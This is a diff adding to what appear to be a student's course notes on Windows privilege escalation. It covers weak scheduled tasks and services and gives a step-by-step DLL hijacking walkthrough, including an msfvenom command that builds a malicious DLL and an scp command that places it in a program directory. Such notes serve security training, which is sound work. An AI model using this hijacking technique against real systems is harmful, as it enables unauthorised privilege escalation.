@@ -750,6 +750,41 @@ https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/09-windows-priv-per
         asInvoker
         highestAvailable
 
+    **Scheduled Tasks & Services**
+    Items to evaluate include:
+        Write Permissions
+        Non-Standard Locations
+        Unquoted Executable Paths
+        Vulnerabilities in Executables
+        Permissions to Run As SYSTEM
+
+    **DEMO: Finding vulnerable Scheduled Tasks**
+    schtasks /query /fo LIST /v
+##    DEMO: DLL Hijacking
+    Identify Vulnerability
+    Take advantage of the default search order for DLLS
+    NAME_NOT_FOUND present in executable’s system calls
+    Validate permissions
+    Create and transfer Malicious DLL
+
+    step by step:
+       1. check services! (weird locations, strange naming, lack of description etc.)
+        2. double click service, check name, description, check path 
+        3. go to the path of the executable in file explorer -> attempt to write something to the directory (just create text file) if you can, this means you can put a DLL in there.
+        4. open sysinternals, run procmon to see what DLL's the .exe uses.
+        5. procmon filter processname contains .dll & process name contains (.exe)
+        & result is NAME NOT FOUND
+        6. then run the executable -> take note of dll's found
+        7. open linops -> create msfvenom command -> msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\Student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+        8. go back to windows on powershell -> scp that file you just created from linops back to windows ->  scp student@10.50.36.204:/home/student/SSPICLI.dll "C:\Program Files (x86)\Putty\SSPICLI.DLL" 
+        9. run the executable -> with this msfvenom command, this should drop a text file with the contents of your command on the desktop.
+        
+        
+        
+
+        
+## get sys internals tools
+    net use z: "\\http://live.sysinternals.com" /persistent:yes 
     
     
     
